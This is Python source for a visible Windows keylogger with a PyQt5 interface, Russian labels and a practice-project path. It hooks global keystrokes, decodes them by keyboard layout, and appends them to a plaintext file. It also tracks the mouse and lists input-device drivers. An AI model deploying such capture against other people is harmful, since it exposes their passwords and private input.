import sys
import threading
import logging
import colorlog
import time
import os
import ctypes
from pynput import mouse, keyboard
from pynput.mouse import Controller as MouseController
from pynput.keyboard import Controller as KeyboardController, Key
from PyQt5 import QtCore, QtWidgets, QtGui
import win32api
import win32con
import win32gui
import win32process
import win32com.client

# Настройка логгера
log_format = "%(log_color)s%(levelname)s:%(name)s:%(message)s"
formatter = colorlog.ColoredFormatter(log_format)
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger = logging.getLogger("device_logger")
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

# ASCII Art (можно оставить или заменить по желанию)
ASCII_ART = r"""
 __  __     ______     __  __     __         ______     ______     ______     ______     ______    
/\ \/ /    /\  ___\   /\ \_\ \   /\ \       /\  __ \   /\  ___\   /\  ___\   /\  ___\   /\  == \   
\ \  _"-.  \ \  __\   \ \____ \  \ \ \____  \ \ \/\ \  \ \ \__ \  \ \ \__ \  \ \  __\   \ \  __<   
 \ \_\ \_\  \ \_____\  \/\_____\  \ \_____\  \ \_____\  \ \_____\  \ \_____\  \ \_\ \_\ 
  \/_/\/_/   \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/ 
"""

# Функции для получения текущей раскладки клавиатуры и преобразования VK-кода в символ
def get_current_keyboard_layout():
    hwnd = win32gui.GetForegroundWindow()
    thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
    hkl = win32api.GetKeyboardLayout(thread_id)
    return hkl & (2**16 - 1)

def vk_to_char(vk_code, scan_code, is_extended, hkl):
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    buf = ctypes.create_unicode_buffer(5)
    state = ctypes.create_string_buffer(256)
    user32.GetKeyboardState(ctypes.byref(state))
    result = user32.ToUnicodeEx(vk_code, scan_code, state, buf, 5, 0, hkl)
    if result > 0:
        return buf.value
    else:
        return ""

# Функции для получения информации об устройствах
def get_device_info():
    try:
        wmi = win32com.client.GetObject("winmgmts:")
        # Получение драйверов клавиатур
        keyboard_drivers = wmi.ExecQuery("SELECT * FROM Win32_PnPSignedDriver WHERE DeviceClass='Keyboard'")
        keyboards = []
        for driver in keyboard_drivers:
            name = driver.DriverName
            status = driver.Status  # Например, "OK"
            keyboards.append((name, status))
        
        # Получение драйверов мышей
        mouse_drivers = wmi.ExecQuery("SELECT * FROM Win32_PnPSignedDriver WHERE DeviceClass='Mouse'")
        mice = []
        for driver in mouse_drivers:
            name = driver.DriverName
            status = driver.Status
            mice.append((name, status))
        
        return keyboards, mice
    except Exception as e:
        logger.error(f"Ошибка при получении информации об устройствах: {e}")
        return [], []

class MouseTracker(QtCore.QObject):
    position_changed = QtCore.pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.mouse_x_y = (0, 0)
        self.controller = MouseController()
        self.is_tracking = False
    
    def get_position(self):
        self.is_tracking = True
        while self.is_tracking:
            mouse_pos = self.controller.position
            if mouse_pos != self.mouse_x_y:
                self.mouse_x_y = mouse_pos
                self.position_changed.emit(f"Позиция мыши: {mouse_pos}")
            time.sleep(0.1)
    
    def stop_tracking(self):
        self.is_tracking = False

class KeyboardTracker(QtCore.QObject):
    input_changed = QtCore.pyqtSignal(str)
    status_changed = QtCore.pyqtSignal()
    
    def __init__(self):
        super().__init__()
        self.controller = KeyboardController()
        self.listener = None
        self.is_tracking = False
    
    def keyboard_input(self):
        self.is_tracking = True
        
        def on_press(key):
            try:
                vk_code = key.vk if hasattr(key, "vk") else None
                scan_code = win32api.MapVirtualKey(vk_code, 0) if vk_code else None
                is_extended = False
                hkl = get_current_keyboard_layout()
                char = vk_to_char(vk_code, scan_code, is_extended, hkl) if vk_code else ""
                if char:
                    self.input_changed.emit(f"Нажата клавиша: {char}")
                    with open("key_saver.txt", "a", encoding="utf-8") as f:
                        f.write(f"{char}")
                else:
                    self.input_changed.emit(f"Специальная клавиша: {key}")
                    with open("key_saver.txt", "a", encoding="utf-8") as f:
                        f.write(f"[{key}]")
            except Exception as e:
                logger.error(f"Ошибка в on_press: {e}")
        
        self.listener = keyboard.Listener(on_press=on_press)
        self.listener.start()
        self.listener.join()
    
    def stop_tracking(self):
        if self.listener and self.listener.running:
            self.listener.stop()
            self.is_tracking = False

class KeyLoggerApp(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("KeyLogger - Компактная версия")
        self.setGeometry(100, 100, 700, 600)
        self.setStyleSheet("background-color: #000000; color: #00FF00;")
        self.init_ui()

        # Инициализация трекеров
        self.mouse_tracker = MouseTracker()
        self.keyboard_tracker = KeyboardTracker()

        # Соединение сигналов
        self.mouse_tracker.position_changed.connect(self.update_mouse_coords)
        self.keyboard_tracker.input_changed.connect(self.update_keyboard_input)
        self.keyboard_tracker.status_changed.connect(self.update_device_status)

        # Таймер для обновления логов
        self.init_log_timer()
    
    def init_ui(self):
        central_widget = QtWidgets.QWidget()
        self.setCentralWidget(central_widget)

        layout = QtWidgets.QVBoxLayout()

        # ASCII Art
        ascii_label = QtWidgets.QLabel(ASCII_ART)
        ascii_label.setFont(QtGui.QFont("Courier", 10))
        ascii_label.setStyleSheet("color: #00FF00;")
        ascii_label.setAlignment(QtCore.Qt.AlignCenter)
        layout.addWidget(ascii_label)

        # Статус устройств
        self.device_status_label = QtWidgets.QLabel("Статус устройств:")
        self.device_status_label.setFont(QtGui.QFont("Courier", 10, QtGui.QFont.Bold))
        layout.addWidget(self.device_status_label)

        # Разделение статуса клавиатуры и мыши
        self.keyboard_status_label = QtWidgets.QLabel("Клавиатура:")
        self.keyboard_status_label.setFont(QtGui.QFont("Courier", 10))
        layout.addWidget(self.keyboard_status_label)

        self.mouse_status_label = QtWidgets.QLabel("Мышь:")
        self.mouse_status_label.setFont(QtGui.QFont("Courier", 10))
        layout.addWidget(self.mouse_status_label)

        # Кнопки
        button_layout = QtWidgets.QHBoxLayout()

        self.check_devices_btn = QtWidgets.QPushButton("Проверить устройства")
        self.check_devices_btn.setStyleSheet("background-color: #00FF00; color: #000000;")
        self.check_devices_btn.clicked.connect(self.check_devices)
        button_layout.addWidget(self.check_devices_btn)

        self.start_mouse_btn = QtWidgets.QPushButton("Запустить трекинг мыши")
        self.start_mouse_btn.setStyleSheet("background-color: #00FF00; color: #000000;")
        self.start_mouse_btn.clicked.connect(self.start_mouse_tracking)
        button_layout.addWidget(self.start_mouse_btn)

        self.start_keyboard_btn = QtWidgets.QPushButton("Запустить логирование клавиатуры")
        self.start_keyboard_btn.setStyleSheet("background-color: #00FF00; color: #000000;")
        self.start_keyboard_btn.clicked.connect(self.start_keyboard_logging)
        button_layout.addWidget(self.start_keyboard_btn)

        layout.addLayout(button_layout)

        # Информация о мыши и клавиатуре
        self.mouse_coords = QtWidgets.QLabel("Позиция мыши: Не запущено")
        self.mouse_coords.setFont(QtGui.QFont("Courier", 10))
        layout.addWidget(self.mouse_coords)

        self.keyboard_input = QtWidgets.QLabel("Ввод с клавиатуры: Не запущено")
        self.keyboard_input.setFont(QtGui.QFont("Courier", 10))
        layout.addWidget(self.keyboard_input)

        # Логи
        logs_label = QtWidgets.QLabel("Логи:")
        logs_label.setFont(QtGui.QFont("Courier", 10, QtGui.QFont.Bold))
        layout.addWidget(logs_label)

        self.log_output = QtWidgets.QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setFixedHeight(200)
        self.log_output.setStyleSheet("background-color: #000000; color: #00FF00; font-family: Courier;")
        layout.addWidget(self.log_output)

        central_widget.setLayout(layout)

    def check_devices(self):
        keyboards, mice = get_device_info()
        
        # Обновление статуса клавиатур
        if keyboards:
            keyboard_status = ""
            for name, status in keyboards:
                keyboard_status += f"- {name}: {status}\n"
        else:
            keyboard_status = "- Клавиатуры не найдены\n"
        self.keyboard_status_label.setText(f"Клавиатура:\n{keyboard_status}")
        
        # Обновление статуса мышей
        if mice:
            mouse_status = ""
            for name, status in mice:
                mouse_status += f"- {name}: {status}\n"
        else:
            mouse_status = "- Мыши не найдены\n"
        self.mouse_status_label.setText(f"Мышь:\n{mouse_status}")
        
        logger.info("Проверены устройства.")

    def start_mouse_tracking(self):
        if not self.mouse_tracker.is_tracking:
            self.mouse_thread = threading.Thread(
                target=self.mouse_tracker.get_position
            )
            self.mouse_thread.daemon = True
            self.mouse_thread.start()
            logger.info("Запущен трекинг мыши.")
            self.start_mouse_btn.setText("Остановить трекинг мыши")
            self.start_mouse_btn.clicked.disconnect()
            self.start_mouse_btn.clicked.connect(self.stop_mouse_tracking)
        else:
            self.stop_mouse_tracking()

    def stop_mouse_tracking(self):
        if self.mouse_tracker.is_tracking:
            self.mouse_tracker.stop_tracking()
            logger.info("Остановлен трекинг мыши.")
            self.start_mouse_btn.setText("Запустить трекинг мыши")
            self.start_mouse_btn.clicked.disconnect()
            self.start_mouse_btn.clicked.connect(self.start_mouse_tracking)
            self.mouse_coords.setText("Позиция мыши: Остановлено")

    def start_keyboard_logging(self):
        if not self.keyboard_tracker.is_tracking:
            self.keyboard_thread = threading.Thread(
                target=self.keyboard_tracker.keyboard_input
            )
            self.keyboard_thread.daemon = True
            self.keyboard_thread.start()
            logger.info("Запущено логирование клавиатуры.")
            self.start_keyboard_btn.setText("Остановить логирование клавиатуры")
            self.start_keyboard_btn.clicked.disconnect()
            self.start_keyboard_btn.clicked.connect(self.stop_keyboard_logging)
        else:
            self.stop_keyboard_logging()

    def stop_keyboard_logging(self):
        if self.keyboard_tracker.is_tracking:
            self.keyboard_tracker.stop_tracking()
            logger.info("Остановлено логирование клавиатуры.")
            self.start_keyboard_btn.setText("Запустить логирование клавиатуры")
            self.start_keyboard_btn.clicked.disconnect()
            self.start_keyboard_btn.clicked.connect(self.start_keyboard_logging)
            self.keyboard_input.setText("Ввод с клавиатуры: Остановлено")

    @QtCore.pyqtSlot(str)
    def update_mouse_coords(self, coords):
        # Обновление GUI в главном потоке
        self.mouse_coords.setText(coords)

    @QtCore.pyqtSlot(str)
    def update_keyboard_input(self, input_text):
        # Обновление GUI в главном потоке
        self.keyboard_input.setText(input_text)

    def update_device_status(self):
        # Обновление статуса устройств
        self.check_devices()

    def init_log_timer(self):
        self.log_timer = QtCore.QTimer()
        self.log_timer.timeout.connect(self.update_logs)
        self.log_timer.start(500)  # Обновлять каждые 500 мс

    def update_logs(self):
        if os.path.exists("key_saver.txt"):
            try:
                with open(
                    "key_saver.txt", "r", encoding="utf-8", errors="replace"
                ) as log_file:
                    logs = log_file.read()
                self.log_output.setPlainText(logs)
                # Автоскролл вниз
                self.log_output.verticalScrollBar().setValue(self.log_output.verticalScrollBar().maximum())
            except Exception as e:
                logger.error(f"Ошибка при чтении файла логов: {e}")

    def start_tracking_threads(self):
        # Теперь трекинг не запускается автоматически
        pass

def main():
    # Установка переменной окружения для Qt плагинов (путь может отличаться)
    os.environ["QT_PLUGIN_PATH"] = (
        r"G:\Тренировка\.venv\Lib\site-packages\PyQt5\Qt5\plugins"
    )
    
    app = QtWidgets.QApplication(sys.argv)
    
    window = KeyLoggerApp()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
